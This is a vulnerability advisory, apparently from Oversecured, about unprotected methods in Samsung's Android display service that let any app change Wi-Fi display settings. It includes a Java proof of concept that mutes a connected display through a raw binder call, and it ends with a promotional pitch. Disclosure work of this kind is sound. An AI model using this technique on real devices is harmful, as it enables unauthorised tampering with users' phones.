# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.08.16</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1000</td>
    </tr>
</table>

# Description

The system service `display` (`android.hardware.display.IDisplayManager`) was created in AOSP but was patched in the Samsung Android Framework. Samsung also added Wi-Fi displays. But the following methods to manage displays have not been protected in any way:
- `setDeviceVolume()`
- `setDeviceVolumeMuted()`
- `setDlnaDevice()`
- `setScreenSharingStatus()`
- `setVolumeKeyEvent()`
- `setWifiDisplayParam()`
- `questWifiDisplayParameter()`
- `questSetWifiDisplayParameters()`
- `updateDexDisplayState()`

This way, the attacker could force the device to connect to the Wi-Fi display and change the connection configuration.

**Proof of Concept**

This code sets the volume to 0 on an already connected display:
```java
static final int TRANSACTION_setDeviceVolume = 33;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("display");

        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
        parcel.writeInt(0);

        Parcel reply = Parcel.obtain();
        binder.transact(TRANSACTION_setDeviceVolume, parcel, reply, 0);
        reply.readException();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.